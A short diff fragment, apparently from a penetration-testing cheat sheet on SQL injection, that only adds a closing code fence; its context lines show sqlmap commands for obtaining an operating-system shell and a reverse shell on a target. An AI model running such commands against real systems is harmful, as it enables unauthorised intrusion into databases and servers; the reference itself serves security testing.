@@ -90,6 +90,7 @@ sqlmap -r login.req --os-shell
 
 # sqlmap reverse shell
 sqlmap -r login.req --os-pwn
+```
 
 SQL Injection Writing a file
 
